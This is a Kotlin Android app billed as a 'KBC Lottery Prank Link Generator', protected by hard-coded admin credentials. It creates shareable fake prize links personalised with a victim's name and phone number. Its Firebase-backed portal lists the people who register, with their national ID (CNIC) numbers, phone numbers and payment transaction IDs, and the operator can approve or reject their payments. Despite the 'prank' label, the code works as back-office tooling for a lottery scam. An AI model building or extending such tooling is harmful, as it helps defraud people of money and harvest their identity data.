package com.example

import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.content.ClipData
import android.content.ClipboardManager
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.util.Log
import android.widget.Toast
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.enableEdgeToEdge
import androidx.compose.foundation.background
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.foundation.text.KeyboardOptions
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.*
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.input.KeyboardType
import androidx.compose.ui.text.input.PasswordVisualTransformation
import androidx.compose.ui.text.style.TextAlign
import androidx.compose.ui.text.style.TextOverflow
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.compose.ui.window.Dialog
import androidx.compose.ui.window.DialogProperties
import androidx.core.app.NotificationCompat
import com.example.ui.theme.MyApplicationTheme
import org.json.JSONArray
import org.json.JSONObject
import com.google.firebase.database.ChildEventListener
import com.google.firebase.database.DataSnapshot
import com.google.firebase.database.DatabaseError
import com.google.firebase.database.FirebaseDatabase
import com.google.firebase.database.ValueEventListener

// Base Model Data Classes (100% Intact)
data class LocalPrankModel(
    val id: Long,
    val victimName: String,
    val victimNumber: String,
    val generatedLink: String
)

data class FirebaseRegistryModel(
    val profileId: String = "",
    val fullName: String = "",
    val mobileNumber: String = "",
    val cnicNumber: String = "",
    val paymentStatus: String = "",
    val trxId: String = ""
)

class MainActivity : ComponentActivity() {
    
    private val channelId = "kbc_registry_alerts"

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        enableEdgeToEdge()
        
        // Setup System Notification Channel immediately on Boot
        createNotificationChannel()
        
        setContent {
            MyApplicationTheme {
                var isAuthenticated by remember { mutableStateOf(false) }
                
                Scaffold(modifier = Modifier.fillMaxSize()) { innerPadding ->
                    if (!isAuthenticated) {
                        LoginScreen(
                            modifier = Modifier.padding(innerPadding),
                            onLoginSuccess = { isAuthenticated = true }
                        )
                    } else {
                        KbcPrankApp(
                            modifier = Modifier.padding(innerPadding),
                            channelId = channelId
                        )
                    }
                }
            }
        }
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val name = "Registry Updates"
            val descriptionText = "Notifications for new registrations"
            val importance = NotificationManager.IMPORTANCE_HIGH
            val channel = NotificationChannel(channelId, name, importance).apply {
                description = descriptionText
            }
            val notificationManager: NotificationManager =
                getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            notificationManager.createNotificationChannel(channel)
        }
    }
}

@Composable
fun LoginScreen(
    modifier: Modifier = Modifier,
    onLoginSuccess: () -> Unit
) {
    var username by remember { mutableStateOf("") }
    var password by remember { mutableStateOf("") }
    val context = LocalContext.current

    Box(
        modifier = modifier
            .fillMaxSize()
            .background(Color(0xFFF5F7FB)),
        contentAlignment = Alignment.Center
    ) {
        Card(
            modifier = Modifier
                .fillMaxWidth()
                .padding(24.dp),
            shape = RoundedCornerShape(20.dp),
            colors = CardDefaults.cardColors(containerColor = Color.White),
            elevation = CardDefaults.cardElevation(defaultElevation = 4.dp)
        ) {
            Column(
                modifier = Modifier.padding(24.dp),
                horizontalAlignment = Alignment.CenterHorizontally
            ) {
                Text(
                    text = "Admin Access",
                    fontSize = 22.sp,
                    fontWeight = FontWeight.Bold,
                    color = Color(0xFF1F2937)
                )
                Spacer(modifier = Modifier.height(24.dp))
                
                OutlinedTextField(
                    value = username,
                    onValueChange = { username = it },
                    label = { Text("ID") },
                    leadingIcon = { Icon(Icons.Default.Person, contentDescription = null) },
                    modifier = Modifier.fillMaxWidth(),
                    singleLine = true,
                    shape = RoundedCornerShape(12.dp)
                )
                
                Spacer(modifier = Modifier.height(16.dp))

                OutlinedTextField(
                    value = password,
                    onValueChange = { password = it },
                    label = { Text("Password") },
                    leadingIcon = { Icon(Icons.Default.Lock, contentDescription = null) },
                    modifier = Modifier.fillMaxWidth(),
                    visualTransformation = PasswordVisualTransformation(),
                    singleLine = true,
                    shape = RoundedCornerShape(12.dp)
                )

                Spacer(modifier = Modifier.height(24.dp))

                Button(
                    onClick = {
                        if (username.trim() == "jani681" && password == "kbc5800/") {
                            onLoginSuccess()
                        } else {
                            Toast.makeText(context, "Invalid ID or Password", Toast.LENGTH_SHORT).show()
                        }
                    },
                    modifier = Modifier
                        .fillMaxWidth()
                        .height(50.dp),
                    shape = RoundedCornerShape(12.dp),
                    colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF1E3A8A))
                ) {
                    Text("Login", fontSize = 16.sp, fontWeight = FontWeight.Bold)
                }
            }
        }
    }
}

@Composable
fun KbcPrankApp(
    modifier: Modifier = Modifier,
    channelId: String
) {
    val context = LocalContext.current
    val sharedPreferences = remember { context.getSharedPreferences("kbc_prank_prefs", Context.MODE_PRIVATE) }
    
    var victimName by remember { mutableStateOf("") }
    var victimNumber by remember { mutableStateOf("") }
    var generatedLink by remember { mutableStateOf("") }
    var showSuccessDialog by remember { mutableStateOf(false) }
    var showRealtimeDialog by remember { mutableStateOf(false) }
    
    val historyList = remember { mutableStateListOf<LocalPrankModel>() }

    // Persistent Background Engine Pipeline Setup
    LaunchedEffect(Unit) {
        val savedJson = sharedPreferences.getString("prank_list_json", "[]") ?: "[]"
        try {
            val jsonArray = JSONArray(savedJson)
            for (i in 0 until jsonArray.length()) {
                val obj = jsonArray.getJSONObject(i)
                historyList.add(
                    LocalPrankModel(
                        id = obj.getLong("id"),
                        victimName = obj.getString("name"),
                        victimNumber = obj.getString("num"),
                        generatedLink = obj.getString("link")
                    )
                )
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }

        // --- BACKGROUND COLD START REALSENSE LISTENER ---
        val rootDbRef = FirebaseDatabase.getInstance().getReference("registrations")
        var isAppInitializing = true

        rootDbRef.addListenerForSingleValueEvent(object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                isAppInitializing = false 
            }
            override fun onCancelled(error: DatabaseError) {}
        })

        rootDbRef.addChildEventListener(object : ChildEventListener {
            override fun onChildAdded(snapshot: DataSnapshot, previousChildName: String?) {
                if (!isAppInitializing) {
                    val name = snapshot.child("fullName").value?.toString() ?: "Someone"
                    val transId = snapshot.child("trxId").value?.toString() ?: "N/A"
                    sendLiveNotification(context, channelId, name, transId)
                }
            }
            override fun onChildChanged(snapshot: DataSnapshot, previousChildName: String?) {}
            override fun onChildRemoved(snapshot: DataSnapshot) {}
            override fun onChildMoved(snapshot: DataSnapshot, previousChildName: String?) {}
            override fun onCancelled(error: DatabaseError) {}
        })
    }

    Box(
        modifier = modifier
            .fillMaxSize()
            .background(Color(0xFFF5F7FB))
    ) {
        Column(
            modifier = Modifier
                .fillMaxSize()
                .padding(16.dp),
            horizontalAlignment = Alignment.CenterHorizontally
        ) {
            // Header Top Layer Card
            Card(
                modifier = Modifier
                    .fillMaxWidth()
                    .padding(bottom = 24.dp),
                shape = RoundedCornerShape(16.dp),
                colors = CardDefaults.cardColors(containerColor = Color(0xFF1E3A8A))
            ) {
                Column(
                    modifier = Modifier.padding(24.dp),
                    horizontalAlignment = Alignment.CenterHorizontally
                ) {
                    Text(
                        text = "KBC Lottery Prank Link Generator",
                        color = Color.White,
                        fontSize = 22.sp,
                        fontWeight = FontWeight.Bold,
                        textAlign = TextAlign.Center
                    )
                    Spacer(modifier = Modifier.height(8.dp))
                    Text(
                        text = "Enter details to generate a working custom prize link",
                        color = Color(0xFF93C5FD),
                        fontSize = 14.sp,
                        textAlign = TextAlign.Center
                    )
                }
            }

            // Input Fields Card Module
            Card(
                modifier = Modifier
                    .fillMaxWidth()
                    .padding(bottom = 24.dp),
                shape = RoundedCornerShape(16.dp),
                colors = CardDefaults.cardColors(containerColor = Color.White),
                elevation = CardDefaults.cardElevation(defaultElevation = 2.dp)
            ) {
                Column(
                    modifier = Modifier.padding(16.dp)
                ) {
                    OutlinedTextField(
                        value = victimName,
                        onValueChange = { victimName = it },
                        label = { Text("Victim Name") },
                        leadingIcon = { Icon(Icons.Default.Person, contentDescription = null) },
                        modifier = Modifier.fillMaxWidth(),
                        singleLine = true,
                        shape = RoundedCornerShape(12.dp)
                    )
                    
                    Spacer(modifier = Modifier.height(16.dp))

                    OutlinedTextField(
                        value = victimNumber,
                        onValueChange = { victimNumber = it },
                        label = { Text("Victim Phone Number") },
                        leadingIcon = { Icon(Icons.Default.Phone, contentDescription = null) },
                        modifier = Modifier.fillMaxWidth(),
                        keyboardOptions = KeyboardOptions(keyboardType = KeyboardType.Phone),
                        singleLine = true,
                        shape = RoundedCornerShape(12.dp)
                    )

                    Spacer(modifier = Modifier.height(24.dp))

                    Button(
                        onClick = {
                            if (victimName.isBlank() || victimNumber.isBlank()) {
                                Toast.makeText(context, "Please enter both details", Toast.LENGTH_SHORT).show()
                            } else {
                                val baseSharedUrl = "https://kbc-lottery.vercel.app/"
                                val encodedName = Uri.encode(victimName.trim())
                                val encodedNumber = Uri.encode(victimNumber.trim())
                                
                                val finalLink = "${baseSharedUrl}?name=${encodedName}&num=${encodedNumber}"
                                generatedLink = finalLink
                                showSuccessDialog = true

                                val newItem = LocalPrankModel(
                                    id = System.currentTimeMillis(),
                                    victimName = victimName.trim(),
                                    victimNumber = victimNumber.trim(),
                                    generatedLink = finalLink
                                )
                                
                                historyList.add(0, newItem)

                                val jsonArray = JSONArray()
                                historyList.forEach {
                                    val obj = JSONObject().apply {
                                        put("id", it.id)
                                        put("name", it.victimName)
                                        put("num", it.victimNumber)
                                        put("link", it.generatedLink)
                                    }
                                    jsonArray.put(obj)
                                }
                                sharedPreferences.edit().putString("prank_list_json", jsonArray.toString()).apply()
                            }
                        },
                        modifier = Modifier
                            .fillMaxWidth()
                            .height(50.dp),
                        shape = RoundedCornerShape(12.dp),
                        colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF2563EB))
                    ) {
                        Icon(Icons.Default.Build, contentDescription = null)
                        Spacer(modifier = Modifier.width(8.dp))
                        Text("Generate Prize Link", fontSize = 16.sp, fontWeight = FontWeight.SemiBold)
                    }

                    Spacer(modifier = Modifier.height(12.dp))

                    Button(
                        onClick = {
                            val intent = Intent(Intent.ACTION_VIEW, Uri.parse("https://kbc-lottery.vercel.app/generator.html"))
                            context.startActivity(intent)
                        },
                        modifier = Modifier
                            .fillMaxWidth()
                            .height(50.dp),
                        shape = RoundedCornerShape(12.dp),
                        colors = ButtonDefaults.buttonColors(containerColor = Color(0xFFDC2626))
                    ) {
                        Icon(Icons.Default.AccountBox, contentDescription = null)
                        Spacer(modifier = Modifier.width(8.dp))
                        Text("Create Registration Certificate", fontSize = 16.sp, fontWeight = FontWeight.SemiBold)
                    }

                    Spacer(modifier = Modifier.height(12.dp))

                    Button(
                        onClick = {
                            val intent = Intent(Intent.ACTION_VIEW, Uri.parse("https://kbc-lottery.vercel.app/registry.html"))
                            context.startActivity(intent)
                        },
                        modifier = Modifier
                            .fillMaxWidth()
                            .height(50.dp),
                        shape = RoundedCornerShape(12.dp),
                        colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF0F172A))
                    ) {
                        Icon(Icons.Default.List, contentDescription = null)
                        Spacer(modifier = Modifier.width(8.dp))
                        Text("صارف پروفائل رجسٹری (Registry)", fontSize = 16.sp, fontWeight = FontWeight.SemiBold)
                    }

                    Spacer(modifier = Modifier.height(12.dp))

                    Button(
                        onClick = { showRealtimeDialog = true },
                        modifier = Modifier
                            .fillMaxWidth()
                            .height(50.dp),
                        shape = RoundedCornerShape(12.dp),
                        colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF10B981))
                    ) {
                        Icon(Icons.Default.Refresh, contentDescription = null)
                        Spacer(modifier = Modifier.width(8.dp))
                        Text("Realtime Data Portal", fontSize = 16.sp, fontWeight = FontWeight.SemiBold)
                    }
                }
            }

            // History Layout Module Header
            Row(
                modifier = Modifier
                    .fillMaxWidth()
                    .padding(horizontal = 4.dp, vertical = 8.dp),
                verticalAlignment = Alignment.CenterVertically
            ) {
                Icon(Icons.Default.Refresh, contentDescription = null, tint = Color.Gray)
                Spacer(modifier = Modifier.width(8.dp))
                Text(
                    text = "Generated Links History",
                    fontSize = 16.sp,
                    fontWeight = FontWeight.Bold,
                    color = Color.DarkGray
                )
            }

            if (historyList.isEmpty()) {
                Box(
                    modifier = Modifier
                        .fillMaxWidth()
                        .weight(1f),
                    contentAlignment = Alignment.Center
                ) {
                    Text("No history yet. Generated links will appear here.", color = Color.Gray, fontSize = 14.sp)
                }
            } else {
                LazyColumn(
                    modifier = Modifier
                        .fillMaxWidth()
                        .weight(1f),
                    verticalArrangement = Arrangement.spacedBy(10.dp)
                ) {
                    items(historyList, key = { it.id }) { prank ->
                        HistoryItemRow(prank = prank, context = context)
                    }
                }
            }
        }

        // Share Action Dialog Block
        if (showSuccessDialog) {
            Dialog(
                onDismissRequest = { showSuccessDialog = false },
                properties = DialogProperties(dismissOnBackPress = true, dismissOnClickOutside = true)
            ) {
                Card(
                    modifier = Modifier
                        .fillMaxWidth()
                        .padding(16.dp),
                    shape = RoundedCornerShape(20.dp),
                    colors = CardDefaults.cardColors(containerColor = Color.White),
                    elevation = CardDefaults.cardElevation(defaultElevation = 8.dp)
                ) {
                    Column(
                        modifier = Modifier.padding(24.dp),
                        horizontalAlignment = Alignment.CenterHorizontally
                    ) {
                        Icon(
                            Icons.Default.CheckCircle,
                            contentDescription = null,
                            tint = Color(0xFF10B981),
                            modifier = Modifier.size(54.dp)
                        )
                        Spacer(modifier = Modifier.height(16.dp))
                        Text("Link Generated Successfully!", fontWeight = FontWeight.Bold, fontSize = 18.sp, color = Color(0xFF1F2937))
                        Spacer(modifier = Modifier.height(12.dp))
                        
                        OutlinedTextField(
                            value = generatedLink,
                            onValueChange = {},
                            readOnly = true,
                            modifier = Modifier.fillMaxWidth(),
                            textStyle = androidx.compose.ui.text.TextStyle(fontSize = 13.sp),
                            shape = RoundedCornerShape(8.dp),
                            colors = OutlinedTextFieldDefaults.colors(
                                focusedBorderColor = Color(0xFF2563EB),
                                unfocusedBorderColor = Color.LightGray
                            )
                        )
                        
                        Spacer(modifier = Modifier.height(20.dp))
                        
                        Row(
                            modifier = Modifier.fillMaxWidth(),
                            horizontalArrangement = Arrangement.spacedBy(12.dp)
                        ) {
                            OutlinedButton(
                                onClick = {
                                    val clipboard = context.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
                                    val clip = ClipData.newPlainText("KBC Link", generatedLink)
                                    clipboard.setPrimaryClip(clip)
                                    Toast.makeText(context, "Link copied to clipboard", Toast.LENGTH_SHORT).show()
                                },
                                modifier = Modifier.weight(1f),
                                shape = RoundedCornerShape(10.dp)
                            ) {
                                Icon(Icons.Default.Share, contentDescription = null, modifier = Modifier.size(18.dp))
                                Spacer(modifier = Modifier.width(6.dp))
                                Text("Copy")
                            }

                            Button(
                                onClick = {
                                    val intent = Intent(Intent.ACTION_SEND).apply {
                                        type = "text/plain"
                                        putExtra(Intent.EXTRA_TEXT, generatedLink)
                                    }
                                    context.startActivity(Intent.createChooser(intent, "Share via"))
                                },
                                modifier = Modifier.weight(1f),
                                shape = RoundedCornerShape(10.dp),
                                colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF10B981))
                            ) {
                                Icon(Icons.Default.Send, contentDescription = null, modifier = Modifier.size(18.dp))
                                Spacer(modifier = Modifier.width(6.dp))
                                Text("Share")
                            }
                        }
                    }
                }
            }
        }

        // Realtime Data Portal Dialog (Featuring Instant Delete Shield Engine)
        if (showRealtimeDialog) {
            val firebaseRecordsList = remember { mutableStateListOf<FirebaseRegistryModel>() }
            
            // Safety confirmation sub-state controllers
            var showDeleteConfirmation by remember { mutableStateOf(false) }
            var targetProfileIdToDelete by remember { mutableStateOf("") }
            var targetNameToDelete by remember { mutableStateOf("") }

            DisposableEffect(showRealtimeDialog) {
                val databaseRef = FirebaseDatabase.getInstance().getReference("registrations")
                val listener = object : ValueEventListener {
                    override fun onDataChange(snapshot: DataSnapshot) {
                        firebaseRecordsList.clear()
                        for (child in snapshot.children) {
                            try {
                                val model = FirebaseRegistryModel(
                                    profileId = child.child("profileId").value?.toString() ?: child.key ?: "",
                                    fullName = child.child("fullName").value?.toString() ?: "",
                                    mobileNumber = child.child("mobileNumber").value?.toString() ?: "",
                                    cnicNumber = child.child("cnicNumber").value?.toString() ?: "",
                                    paymentStatus = child.child("paymentStatus").value?.toString() ?: "pending",
                                    trxId = child.child("trxId").value?.toString() ?: "Pending"
                                )
                                firebaseRecordsList.add(0, model)
                            } catch (e: Exception) {
                                e.printStackTrace()
                            }
                        }
                    }
                    override fun onCancelled(error: DatabaseError) {
                        Log.e("KBC_FIREBASE_ERR", error.message)
                    }
                }
                
                databaseRef.addValueEventListener(listener)
                
                onDispose {
                    databaseRef.removeEventListener(listener)
                }
            }

            Dialog(
                onDismissRequest = { showRealtimeDialog = false },
                properties = DialogProperties(usePlatformDefaultWidth = false, dismissOnBackPress = true, dismissOnClickOutside = false)
            ) {
                Surface(
                    modifier = Modifier.fillMaxSize(),
                    color = Color(0xFFF5F7FB)
                ) {
                    Column(
                        modifier = Modifier
                            .fillMaxSize()
                            .padding(16.dp)
                    ) {
                        Row(
                            modifier = Modifier.fillMaxWidth(),
                            verticalAlignment = Alignment.CenterVertically,
                            horizontalArrangement = Arrangement.SpaceBetween
                        ) {
                            Row(verticalAlignment = Alignment.CenterVertically) {
                                Icon(Icons.Default.Refresh, contentDescription = null, tint = Color(0xFF10B981), modifier = Modifier.size(28.dp))
                                Spacer(modifier = Modifier.width(8.dp))
                                Text("Realtime Active Records", fontWeight = FontWeight.Bold, fontSize = 20.sp, color = Color(0xFF1F2937))
                            }
                            IconButton(onClick = { showRealtimeDialog = false }) {
                                Icon(Icons.Default.Close, contentDescription = "Close")
                            }
                        }

                        Spacer(modifier = Modifier.height(16.dp))

                        if (firebaseRecordsList.isEmpty()) {
                            Box(
                                modifier = Modifier
                                    .fillMaxWidth()
                                    .weight(1f),
                                contentAlignment = Alignment.Center
                            ) {
                                CircularProgressIndicator(color = Color(0xFF10B981))
                            }
                        } else {
                            LazyColumn(
                                modifier = Modifier
                                    .fillMaxWidth()
                                    .weight(1f),
                                verticalArrangement = Arrangement.spacedBy(12.dp)
                            ) {
                                items(firebaseRecordsList, key = { it.profileId }) { record ->
                                    Card(
                                        modifier = Modifier.fillMaxWidth(),
                                        shape = RoundedCornerShape(14.dp),
                                        colors = CardDefaults.cardColors(containerColor = Color.White),
                                        elevation = CardDefaults.cardElevation(defaultElevation = 2.dp)
                                    ) {
                                        Column(modifier = Modifier.padding(14.dp)) {
                                            Row(
                                                modifier = Modifier.fillMaxWidth(),
                                                horizontalArrangement = Arrangement.SpaceBetween,
                                                verticalAlignment = Alignment.CenterVertically
                                            ) {
                                                Text(text = record.fullName, fontWeight = FontWeight.Bold, fontSize = 16.sp, color = Color(0xFF1F2937))
                                                
                                                val badgeColor = when (record.paymentStatus.lowercase()) {
                                                    "approved" -> Color(0xFFD1FAE5)
                                                    "rejected" -> Color(0xFFFEE2E2)
                                                    else -> Color(0xFFFEF3C7)
                                                }
                                                val badgeTextColor = when (record.paymentStatus.lowercase()) {
                                                    "approved" -> Color(0xFF065F46)
                                                    "rejected" -> Color(0xFF991B1B)
                                                    else -> Color(0xFF92400E)
                                                }
                                                
                                                Surface(
                                                    color = badgeColor,
                                                    shape = RoundedCornerShape(8.dp)
                                                ) {
                                                    Text(
                                                        text = record.paymentStatus.uppercase(),
                                                        modifier = Modifier.padding(horizontal = 8.dp, vertical = 4.dp),
                                                        fontSize = 11.sp,
                                                        fontWeight = FontWeight.Bold,
                                                        color = badgeTextColor
                                                    )
                                                }
                                            }

                                            Spacer(modifier = Modifier.height(6.dp))
                                            Text(text = "Phone: ${record.mobileNumber}", fontSize = 13.sp, color = Color.Gray)
                                            Text(text = "CNIC: ${record.cnicNumber}", fontSize = 13.sp, color = Color.Gray)
                                            Text(text = "Trx ID: ${record.trxId}", fontSize = 13.sp, fontWeight = FontWeight.SemiBold, color = Color(0xFF1E3A8A))
                                            Text(text = "ID: ${record.profileId}", fontSize = 11.sp, color = Color.LightGray)

                                            Spacer(modifier = Modifier.height(12.dp))
                                            
                                            // Action Suite Row Layer
                                            Row(
                                                modifier = Modifier.fillMaxWidth(),
                                                horizontalArrangement = Arrangement.spacedBy(6.dp),
                                                verticalAlignment = Alignment.CenterVertically
                                            ) {
                                                OutlinedButton(
                                                    onClick = {
                                                        val dbRef = FirebaseDatabase.getInstance().getReference("registrations")
                                                        val updates = mapOf("paymentStatus" to "rejected")
                                                        dbRef.child(record.profileId).updateChildren(updates)
                                                            .addOnSuccessListener {
                                                                Toast.makeText(context, "Registry Rejected", Toast.LENGTH_SHORT).show()
                                                            }
                                                    },
                                                    modifier = Modifier.weight(1f),
                                                    shape = RoundedCornerShape(8.dp),
                                                    colors = ButtonDefaults.outlinedButtonColors(contentColor = Color(0xFFDC2626))
                                                ) {
                                                    Icon(Icons.Default.Close, contentDescription = null, modifier = Modifier.size(14.dp))
                                                    Spacer(modifier = Modifier.width(2.dp))
                                                    Text("Reject", fontSize = 12.sp)
                                                }

                                                Button(
                                                    onClick = {
                                                        val dbRef = FirebaseDatabase.getInstance().getReference("registrations")
                                                        val updates = mapOf("paymentStatus" to "approved")
                                                        dbRef.child(record.profileId).updateChildren(updates)
                                                            .addOnSuccessListener {
                                                                Toast.makeText(context, "Registry Approved", Toast.LENGTH_SHORT).show()
                                                            }
                                                    },
                                                    modifier = Modifier.weight(1f),
                                                    shape = RoundedCornerShape(8.dp),
                                                    colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF10B981))
                                                ) {
                                                    Icon(Icons.Default.Check, contentDescription = null, modifier = Modifier.size(14.dp))
                                                    Spacer(modifier = Modifier.width(2.dp))
                                                    Text("Approve", fontSize = 12.sp)
                                                }

                                                // Clean Execution Surgical Delete Module Trigger
                                                IconButton(
                                                    onClick = {
                                                        targetProfileIdToDelete = record.profileId
                                                        targetNameToDelete = record.fullName
                                                        showDeleteConfirmation = true
                                                    },
                                                    modifier = Modifier
                                                        .size(40.dp)
                                                        .background(Color(0xFFFEE2E2), shape = RoundedCornerShape(8.dp))
                                                ) {
                                                    Icon(
                                                        Icons.Default.Delete,
                                                        contentDescription = "Delete Record",
                                                        tint = Color(0xFFDC2626),
                                                        modifier = Modifier.size(20.dp)
                                                    )
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }

                        Spacer(modifier = Modifier.height(16.dp))

                        Button(
                            onClick = { showRealtimeDialog = false },
                            modifier = Modifier.fillMaxWidth().height(48.dp),
                            shape = RoundedCornerShape(10.dp),
                            colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF1F2937))
                        ) {
                            Text("Close Portal", fontWeight = FontWeight.Bold)
                        }
                    }
                }
            }

            // High Stability Safety Confirmation Dialog Block
            if (showDeleteConfirmation) {
                AlertDialog(
                    onDismissRequest = { showDeleteConfirmation = false },
                    title = { Text(text = "Delete Registry Record?", fontWeight = FontWeight.Bold, fontSize = 18.sp) },
                    text = { Text(text = "Are you completely sure you want to permanently delete $targetNameToDelete's profile registry from Firebase? This action cannot be undone.", fontSize = 14.sp) },
                    confirmButton = {
                        Button(
                            onClick = {
                                if (targetProfileIdToDelete.isNotBlank()) {
                                    FirebaseDatabase.getInstance().getReference("registrations")
                                        .child(targetProfileIdToDelete)
                                        .removeValue()
                                        .addOnSuccessListener {
                                            Toast.makeText(context, "Record Deleted Successfully", Toast.LENGTH_SHORT).show()
                                            showDeleteConfirmation = false
                                            targetProfileIdToDelete = ""
                                            targetNameToDelete = ""
                                        }
                                        .addOnFailureListener { err ->
                                            Toast.makeText(context, "Error: ${err.message}", Toast.LENGTH_SHORT).show()
                                        }
                                }
                            },
                            colors = ButtonDefaults.buttonColors(containerColor = Color(0xFFDC2626)),
                            shape = RoundedCornerShape(8.dp)
                        ) {
                            Text("Delete Permanently", fontWeight = FontWeight.SemiBold)
                        }
                    },
                    dismissButton = {
                        OutlinedButton(
                            onClick = { 
                                showDeleteConfirmation = false
                                targetProfileIdToDelete = ""
                                targetNameToDelete = ""
                            },
                            shape = RoundedCornerShape(8.dp)
                        ) {
                            Text("Cancel")
                        }
                    }
                )
            }
        }
    }
}

@Composable
fun HistoryItemRow(prank: LocalPrankModel, context: Context) {
    Card(
        modifier = Modifier.fillMaxWidth(),
        shape = RoundedCornerShape(12.dp),
        colors = CardDefaults.cardColors(containerColor = Color.White),
        elevation = CardDefaults.cardElevation(defaultElevation = 1.dp)
    ) {
        Row(
            modifier = Modifier
                .fillMaxWidth()
                .padding(12.dp),
            verticalAlignment = Alignment.CenterVertically,
            horizontalArrangement = Arrangement.SpaceBetween
        ) {
            Column(modifier = Modifier.weight(1f)) {
                Text(
                    text = prank.victimName,
                    fontWeight = FontWeight.Bold,
                    fontSize = 15.sp,
                    color = Color(0xFF1F2937)
                )
                Text(
                    text = prank.victimNumber,
                    fontSize = 13.sp,
                    color = Color.Gray
                )
                Spacer(modifier = Modifier.height(4.dp))
                Text(
                    text = prank.generatedLink,
                    fontSize = 11.sp,
                    color = Color(0xFF2563EB),
                    maxLines = 1,
                    overflow = TextOverflow.Ellipsis
                )
            }
            
            Row(horizontalArrangement = Arrangement.spacedBy(4.dp)) {
                IconButton(onClick = {
                    val clipboard = context.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
                    val clip = ClipData.newPlainText("KBC Link", prank.generatedLink)
                    clipboard.setPrimaryClip(clip)
                    Toast.makeText(context, "Copied!", Toast.LENGTH_SHORT).show()
                }) {
                    Icon(Icons.Default.Share, contentDescription = "Copy", tint = Color(0xFF4B5563))
                }

                IconButton(onClick = {
                    val intent = Intent(Intent.ACTION_SEND).apply {
                        type = "text/plain"
                        putExtra(Intent.EXTRA_TEXT, prank.generatedLink)
                    }
                    context.startActivity(Intent.createChooser(intent, "Share via"))
                }) {
                    Icon(Icons.Default.Send, contentDescription = "Share", tint = Color(0xFF10B981))
                }
            }
        }
    }
}

fun sendLiveNotification(context: Context, channelId: String, applicantName: String, trxId: String) {
    val intent = Intent(context, MainActivity::class.java).apply {
        flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK
    }
    val pendingIntent: PendingIntent = PendingIntent.getActivity(
        context, 0, intent, 
        PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
    )

    val builder = NotificationCompat.Builder(context, channelId)
        .setSmallIcon(android.R.drawable.stat_notify_chat)
        .setContentTitle("New Registration Alert! 🔔")
        .setContentText("User: $applicantName | TrxID: $trxId")
        .setPriority(NotificationCompat.PRIORITY_HIGH)
        .setContentIntent(pendingIntent)
        .setAutoCancel(true)

    val notificationManager = context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
    notificationManager.notify(System.currentTimeMillis().toInt(), builder.build())
}
